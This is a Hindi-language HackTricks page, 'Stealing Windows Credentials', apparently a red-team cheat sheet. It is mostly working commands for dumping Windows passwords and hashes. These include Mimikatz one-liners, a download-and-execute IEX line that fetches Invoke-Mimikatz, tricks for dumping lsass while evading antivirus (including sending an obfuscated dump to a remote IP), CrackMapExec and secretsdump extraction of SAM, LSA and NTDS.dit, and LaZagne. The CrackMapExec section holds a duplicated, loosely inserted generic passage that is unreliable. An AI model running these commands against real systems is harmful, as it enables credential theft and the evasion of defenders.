# Stealing Windows Credentials

<details>

<summary><strong>शून्य से हीरो तक AWS हैकिंग सीखें</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks को समर्थन देने के अन्य तरीके:

* यदि आप **HackTricks में अपनी कंपनी का विज्ञापन देखना चाहते हैं** या **HackTricks को PDF में डाउनलोड करना चाहते हैं** तो [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारे विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) का संग्रह
* **💬 Discord समूह** [**में शामिल हों**](https://discord.gg/hRep4RUj7f) या [**telegram समूह**](https://t.me/peass) या **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live) पर **फॉलो करें**।
* **अपने हैकिंग ट्रिक्स को PRs सबमिट करके साझा करें** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में।

</details>

## Credentials Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Mimikatz और क्या कर सकता है, यह जानने के लिए** [**इस पेज**](credentials-mimikatz.md)** पर जाएं।**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**कुछ संभावित क्रेडेंशियल्स सुरक्षा के बारे में यहाँ जानें।**](credentials-protections.md) **यह सुरक्षा Mimikatz को कुछ क्रेडेंशियल्स निकालने से रोक सकती है।**

## Meterpreter के साथ क्रेडेंशियल्स

[**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **का उपयोग करें जो** मैंने **पीड़ित के अंदर पासवर्ड और हैश खोजने के लिए** बनाया है।
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## Bypassing AV

### Procdump + Mimikatz

चूंकि **Procdump** [**SysInternals**](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) **से एक वैध Microsoft टूल है**, इसे Defender द्वारा नहीं पहचाना जाता है।\
आप इस टूल का उपयोग **lsass प्रक्रिया को डंप करने**, **डंप डाउनलोड करने** और **स्थानीय रूप से डंप से क्रेडेंशियल्स निकालने** के लिए कर सकते हैं।

{% code title="Dump lsass" %}
```bash
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```
{% endcode %}

{% code title="Extract credentials from the dump" %}

{% endcode %}

{% code title="Extract credentials from the dump" %}
```c
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
{% endcode %}

यह प्रक्रिया स्वचालित रूप से [SprayKatz](https://github.com/aas-n/spraykatz) के साथ की जाती है: `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**नोट**: कुछ **AV** **procdump.exe से lsass.exe को dump** करने के उपयोग को **malicious** के रूप में **detect** कर सकते हैं, क्योंकि वे **"procdump.exe" और "lsass.exe"** स्ट्रिंग को **detect** कर रहे हैं। इसलिए **procdump** को **lsass.exe के नाम** के बजाय **lsass.exe के PID** को **argument** के रूप में **pass** करना **stealthier** है।

### **comsvcs.dll** के साथ lsass को dump करना

`C:\Windows\System32` में पाई जाने वाली एक DLL जिसका नाम **comsvcs.dll** है, **क्रैश की स्थिति में प्रक्रिया मेमोरी को dump** करने के लिए जिम्मेदार है। इस DLL में एक **function** है जिसका नाम **`MiniDumpW`** है, जिसे `rundll32.exe` का उपयोग करके बुलाया जाता है।\
पहले दो तर्कों का उपयोग अप्रासंगिक है, लेकिन तीसरा तीन घटकों में विभाजित है। dump की जाने वाली प्रक्रिया ID पहला घटक है, dump फ़ाइल का स्थान दूसरा घटक है, और तीसरा घटक केवल शब्द **full** है। कोई वैकल्पिक विकल्प नहीं हैं।\
इन तीन घटकों को पार्स करने के बाद, DLL dump फ़ाइल बनाने और निर्दिष्ट प्रक्रिया की मेमोरी को इस फ़ाइल में स्थानांतरित करने में संलग्न है।\
**comsvcs.dll** का उपयोग lsass प्रक्रिया को dump करने के लिए किया जा सकता है, जिससे procdump को अपलोड और निष्पादित करने की आवश्यकता समाप्त हो जाती है। इस विधि का विवरण [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords) पर दिया गया है।

निम्नलिखित कमांड निष्पादन के लिए उपयोग किया जाता है:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**आप इस प्रक्रिया को** [**lssasy**](https://github.com/Hackndo/lsassy)**के साथ स्वचालित कर सकते हैं।**

### **Task Manager के साथ lsass डंप करना**

1. Task Bar पर राइट क्लिक करें और Task Manager पर क्लिक करें
2. More details पर क्लिक करें
3. Processes टैब में "Local Security Authority Process" प्रक्रिया को खोजें
4. "Local Security Authority Process" प्रक्रिया पर राइट क्लिक करें और "Create dump file" पर क्लिक करें।

### procdump के साथ lsass डंप करना

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) एक Microsoft साइन किया हुआ बाइनरी है जो [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) सूट का हिस्सा है।
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## Dumpin lsass with PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) एक Protected Process Dumper Tool है जो मेमोरी डंप को अस्पष्ट करने और इसे रिमोट वर्कस्टेशनों पर ट्रांसफर करने का समर्थन करता है बिना इसे डिस्क पर डाले।

**मुख्य कार्यक्षमताएँ**:

1. PPL सुरक्षा को बायपास करना
2. मेमोरी डंप फाइलों को अस्पष्ट करना ताकि Defender सिग्नेचर-आधारित डिटेक्शन मैकेनिज्म से बचा जा सके
3. RAW और SMB अपलोड विधियों के साथ मेमोरी डंप को अपलोड करना बिना इसे डिस्क पर डाले (fileless dump)

{% code overflow="wrap" %}
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
{% endcode %}

## CrackMapExec

### Dump SAM hashes

### SAM हैश डंप करें
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### LSA सीक्रेट्स डंप करें

LSA (Local Security Authority) सीक्रेट्स में पासवर्ड, NTLM हैश, और अन्य संवेदनशील जानकारी होती है। इन्हें डंप करने के लिए, आप निम्नलिखित तरीकों का उपयोग कर सकते हैं:

#### Mimikatz

Mimikatz एक प्रसिद्ध टूल है जिसका उपयोग LSA सीक्रेट्स को डंप करने के लिए किया जाता है। इसे निम्नलिखित कमांड के साथ उपयोग करें:

```shell
mimikatz # sekurlsa::logonpasswords
```

#### Windows Credential Editor (WCE)

WCE एक और टूल है जिसका उपयोग LSA सीक्रेट्स को डंप करने के लिए किया जा सकता है। इसे निम्नलिखित कमांड के साथ उपयोग करें:

```shell
wce -w
```

#### Invoke-DumpCreds

PowerShell के साथ, आप `Invoke-DumpCreds` स्क्रिप्ट का उपयोग कर सकते हैं:

```powershell
Invoke-DumpCreds
```

### SAM और SYSTEM रजिस्ट्री हाइव्स डंप करें

SAM और SYSTEM रजिस्ट्री हाइव्स में पासवर्ड हैश होते हैं। इन्हें डंप करने के लिए, आप निम्नलिखित तरीकों का उपयोग कर सकते हैं:

#### रजिस्ट्री हाइव्स को एक्सपोर्ट करें

आप रजिस्ट्री हाइव्स को निम्नलिखित कमांड के साथ एक्सपोर्ट कर सकते हैं:

```shell
reg save hklm\sam sam.save
reg save hklm\system system.save
```

#### bkhive और samdump2

एक्सपोर्ट की गई फाइलों से पासवर्ड हैश निकालने के लिए, आप `bkhive` और `samdump2` का उपयोग कर सकते हैं:

```shell
bkhive system.save key
samdump2 sam.save key
```

### Cached Credentials डंप करें

Windows सिस्टम में Cached Credentials को डंप करने के लिए, आप निम्नलिखित तरीकों का उपयोग कर सकते हैं:

#### Mimikatz

Mimikatz का उपयोग Cached Credentials को डंप करने के लिए भी किया जा सकता है:

```shell
mimikatz # sekurlsa::logonpasswords
```

#### Cachedump

Cachedump एक और टूल है जिसका उपयोग Cached Credentials को डंप करने के लिए किया जा सकता है:

```shell
cachedump
```

### निष्कर्ष

Windows सिस्टम से क्रेडेंशियल्स को डंप करने के कई तरीके हैं। उपरोक्त टूल्स और तकनीकों का उपयोग करके, आप LSA सीक्रेट्स, SAM और SYSTEM रजिस्ट्री हाइव्स, और Cached Credentials को सफलतापूर्वक डंप कर सकते हैं।
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### लक्ष्य DC से NTDS.dit डंप करें
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### लक्ष्य DC से NTDS.dit पासवर्ड इतिहास डंप करें
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### प्रत्येक NTDS.dit खाते के लिए pwdLastSet attribute दिखाएं

```shell
dsquery * -filter "(&(objectCategory=person)(objectClass=user))" -attr samAccountName pwdLastSet
```

यह कमांड प्रत्येक NTDS.dit खाते के लिए `pwdLastSet` attribute दिखाएगा।
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Stealing SAM & SYSTEM

ये फाइलें _C:\windows\system32\config\SAM_ और _C:\windows\system32\config\SYSTEM_ में **स्थित** होनी चाहिए। लेकिन **आप इन्हें सामान्य तरीके से कॉपी नहीं कर सकते** क्योंकि ये संरक्षित हैं।

### Registry से

इन फाइलों को चुराने का सबसे आसान तरीका है कि रजिस्ट्री से एक कॉपी प्राप्त करें:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Download** उन फाइलों को अपनी Kali मशीन पर और **hashes को extract करें** उपयोग करते हुए:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

आप इस सेवा का उपयोग करके संरक्षित फ़ाइलों की प्रतिलिपि बना सकते हैं। इसके लिए आपको Administrator होना आवश्यक है।

#### vssadmin का उपयोग करना

vssadmin बाइनरी केवल Windows Server संस्करणों में उपलब्ध है।
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
लेकिन आप **Powershell** से भी वही कर सकते हैं। यह **SAM फाइल को कॉपी करने का एक उदाहरण** है (यहां उपयोग की गई हार्ड ड्राइव "C:" है और इसे C:\users\Public में सेव किया गया है) लेकिन आप इसका उपयोग किसी भी प्रोटेक्टेड फाइल को कॉपी करने के लिए कर सकते हैं:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
$voume.Delete();if($notrunning -eq 1){$service.Stop()}
```
### Invoke-NinjaCopy

अंत में, आप [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) का उपयोग करके SAM, SYSTEM और ntds.dit की एक प्रति बना सकते हैं।
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Active Directory Credentials - NTDS.dit**

**NTDS.dit** फाइल को **Active Directory** का दिल माना जाता है, जो उपयोगकर्ता ऑब्जेक्ट्स, समूहों और उनकी सदस्यताओं के बारे में महत्वपूर्ण डेटा रखता है। यह वह जगह है जहां डोमेन उपयोगकर्ताओं के **पासवर्ड हैश** संग्रहीत होते हैं। यह फाइल एक **Extensible Storage Engine (ESE)** डेटाबेस है और **_%SystemRoom%/NTDS/ntds.dit_** पर स्थित है।

इस डेटाबेस में तीन मुख्य तालिकाएँ रखी जाती हैं:

- **Data Table**: यह तालिका उपयोगकर्ताओं और समूहों जैसे ऑब्जेक्ट्स के बारे में विवरण संग्रहीत करने का कार्य करती है।
- **Link Table**: यह समूह सदस्यताओं जैसे संबंधों का ट्रैक रखती है।
- **SD Table**: प्रत्येक ऑब्जेक्ट के लिए **सुरक्षा विवरण** यहाँ रखे जाते हैं, जो संग्रहीत ऑब्जेक्ट्स की सुरक्षा और एक्सेस नियंत्रण सुनिश्चित करते हैं।

इस बारे में अधिक जानकारी: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows _Ntdsa.dll_ का उपयोग उस फाइल के साथ इंटरैक्ट करने के लिए करता है और इसका उपयोग _lsass.exe_ द्वारा किया जाता है। फिर, **NTDS.dit** फाइल का **कुछ हिस्सा** **`lsass`** मेमोरी के अंदर स्थित हो सकता है (आप नवीनतम एक्सेस किए गए डेटा को पा सकते हैं, संभवतः प्रदर्शन सुधार के कारण **कैश** का उपयोग करके)।

#### NTDS.dit के अंदर हैश को डिक्रिप्ट करना

हैश को 3 बार सिफर किया जाता है:

1. **BOOTKEY** और **RC4** का उपयोग करके पासवर्ड एन्क्रिप्शन कुंजी (**PEK**) को डिक्रिप्ट करें।
2. **PEK** और **RC4** का उपयोग करके **हैश** को डिक्रिप्ट करें।
3. **DES** का उपयोग करके **हैश** को डिक्रिप्ट करें।

**PEK** का **समान मान** हर **डोमेन नियंत्रक** में होता है, लेकिन इसे **NTDS.dit** फाइल के अंदर **BOOTKEY** का उपयोग करके **सिफर** किया जाता है, जो **डोमेन नियंत्रक की SYSTEM फाइल (डोमेन नियंत्रकों के बीच अलग होता है)** का होता है। यही कारण है कि NTDS.dit फाइल से क्रेडेंशियल्स प्राप्त करने के लिए **आपको NTDS.dit और SYSTEM फाइल्स की आवश्यकता होती है** (_C:\Windows\System32\config\SYSTEM_)।

### Ntdsutil का उपयोग करके NTDS.dit की कॉपी करना

Windows Server 2008 से उपलब्ध।
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
आप **ntds.dit** फाइल की कॉपी करने के लिए [**volume shadow copy**](./#stealing-sam-and-system) ट्रिक का भी उपयोग कर सकते हैं। याद रखें कि आपको **SYSTEM file** की एक कॉपी की भी आवश्यकता होगी (फिर से, इसे [**registry से डंप करें या volume shadow copy**](./#stealing-sam-and-system) ट्रिक का उपयोग करें)।

### **NTDS.dit से हैश निकालना**

एक बार जब आपने **NTDS.dit** और **SYSTEM** फाइलें **प्राप्त** कर लीं, तो आप _secretsdump.py_ जैसे टूल का उपयोग करके **हैश निकाल सकते हैं**:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
आप एक वैध डोमेन एडमिन उपयोगकर्ता का उपयोग करके उन्हें **स्वचालित रूप से निकाल सकते हैं**:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
**बड़े NTDS.dit फाइलों** के लिए इसे [gosecretsdump](https://github.com/c-sto/gosecretsdump) का उपयोग करके निकालने की सिफारिश की जाती है।

अंत में, आप **metasploit module**: _post/windows/gather/credentials/domain\_hashdump_ या **mimikatz** `lsadump::lsa /inject` का भी उपयोग कर सकते हैं।

### **NTDS.dit से SQLite डेटाबेस में डोमेन ऑब्जेक्ट्स निकालना**

NTDS ऑब्जेक्ट्स को [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite) के साथ SQLite डेटाबेस में निकाला जा सकता है। न केवल सीक्रेट्स निकाले जाते हैं बल्कि पूरे ऑब्जेक्ट्स और उनके एट्रिब्यूट्स भी निकाले जाते हैं ताकि जब raw NTDS.dit फाइल पहले से ही प्राप्त हो, तो आगे की जानकारी निकाली जा सके।
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
`SYSTEM` hive वैकल्पिक है लेकिन यह गुप्त जानकारी को डिक्रिप्ट करने की अनुमति देता है (NT & LM हैश, स्पष्ट पासवर्ड जैसे पूरक क्रेडेंशियल्स, kerberos या ट्रस्ट कीज, NT & LM पासवर्ड इतिहास)। अन्य जानकारी के साथ, निम्नलिखित डेटा निकाला जाता है: उपयोगकर्ता और मशीन खाते उनके हैश के साथ, UAC फ्लैग्स, अंतिम लॉगऑन और पासवर्ड परिवर्तन के लिए टाइमस्टैम्प, खाते का विवरण, नाम, UPN, SPN, समूह और पुनरावर्ती सदस्यता, संगठनात्मक इकाइयों का पेड़ और सदस्यता, ट्रस्ट प्रकार, दिशा और विशेषताओं के साथ विश्वसनीय डोमेन...

## Lazagne

बाइनरी को [यहां](https://github.com/AlessandroZ/LaZagne/releases) से डाउनलोड करें। आप इस बाइनरी का उपयोग कई सॉफ़्टवेयर से क्रेडेंशियल्स निकालने के लिए कर सकते हैं।
```
lazagne.exe all
```
## SAM और LSASS से क्रेडेंशियल्स निकालने के लिए अन्य उपकरण

### Windows credentials Editor (WCE)

इस टूल का उपयोग मेमोरी से क्रेडेंशियल्स निकालने के लिए किया जा सकता है। इसे यहाँ से डाउनलोड करें: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

SAM फाइल से क्रेडेंशियल्स निकालें
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

SAM फ़ाइल से क्रेडेंशियल्स निकालें
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

इसे यहाँ से डाउनलोड करें: [http://www.tarasco.org/security/pwdump\_7](http://www.tarasco.org/security/pwdump\_7) और बस **इसे निष्पादित करें** और पासवर्ड्स निकाल लिए जाएंगे।

## सुरक्षा उपाय

[**यहाँ कुछ क्रेडेंशियल्स सुरक्षा के बारे में जानें।**](credentials-protections.md)

<details>

<summary><strong>शून्य से हीरो तक AWS हैकिंग सीखें</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks को समर्थन देने के अन्य तरीके:

* यदि आप **अपनी कंपनी को HackTricks में विज्ञापित करना चाहते हैं** या **HackTricks को PDF में डाउनलोड करना चाहते हैं** तो [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारे विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) का संग्रह
* **💬 Discord समूह** [**में शामिल हों**](https://discord.gg/hRep4RUj7f) या [**telegram समूह**](https://t.me/peass) में शामिल हों या **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live) पर हमें **फॉलो करें**।
* **अपने हैकिंग ट्रिक्स को** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में PRs सबमिट करके **साझा करें**।

</details>
